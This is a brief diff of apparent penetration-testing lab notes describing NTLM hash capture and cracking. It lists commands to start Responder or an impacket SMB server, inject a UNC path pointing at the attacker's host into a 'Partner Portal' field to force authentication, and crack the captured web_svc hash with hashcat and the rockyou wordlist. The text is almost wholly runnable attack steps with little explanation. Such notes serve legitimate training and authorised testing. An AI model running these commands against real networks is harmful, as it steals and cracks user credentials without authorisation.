@@ -1,1 +1,13 @@
+└─$ sudo responder -I tun0 -wv 
 
+Snag credentials forcing authentication to our impacket-smbserver/Responder smb server. 
+
+UNC Path from the Partner Portal \\192.168.45.x\smbshare 
+\\192.168.45.x\smbshare
+
+└─$ sudo responder -I tun0 -wv 
+or
+└─$ impacket-smbserver smbshare '/home/kali/ms01/smb' -smb2support 
+
+Crack the hash.
+hashcat -m 5600 web_svc.hash /usr/share/wordlists/rockyou.txt 
